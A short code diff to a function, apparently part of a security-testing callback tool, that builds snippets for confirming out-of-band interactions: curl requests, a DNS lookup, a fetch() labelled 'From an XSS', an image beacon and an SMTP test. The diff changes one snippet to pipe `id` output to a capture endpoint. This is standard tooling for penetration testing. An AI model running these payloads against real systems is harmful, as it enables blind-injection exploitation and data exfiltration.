@@ -70,33 +70,33 @@ export function callbackSnippets(
   const url = `${scheme}://${httpDomain}`;
   return [
     {
-      label: "HTTP callback",
-      detail: "A quick connection check",
+      label: "GET",
+      detail: "Plain request",
       code: `curl '${url}/probe'`,
     },
     {
-      label: "POST data",
-      detail: "Send output into the queue",
-      code: `printf 'hello kebab' | curl --data-binary @- '${url}/capture'`,
+      label: "POST",
+      detail: "Pipe output in",
+      code: `id | curl --data-binary @- '${url}/capture'`,
     },
     {
-      label: "DNS callback",
-      detail: "Observe an out-of-band lookup",
+      label: "DNS",
+      detail: "Lookup only",
       code: `nslookup probe.${dnsDomain}`,
     },
     {
-      label: "Browser fetch",
-      detail: "Fire a callback from JavaScript",
+      label: "fetch()",
+      detail: "From an XSS",
       code: `fetch('${url}/probe', {mode: 'no-cors'})`,
     },
     {
-      label: "Image beacon",
-      detail: "A simple HTML callback",
+      label: "<img>",
+      detail: "HTML injection",
       code: `<img src="${url}/beacon" alt="">`,
     },
     {
-      label: "SMTP callback",
-      detail: "Capture a test email",
+      label: "SMTP",
+      detail: "Test mail",
       code: `swaks --to test@${dnsDomain} --from ctf@example.com --server ${dnsDomain.split(".").slice(1).join(".")} --port 25`,
     },
   ];
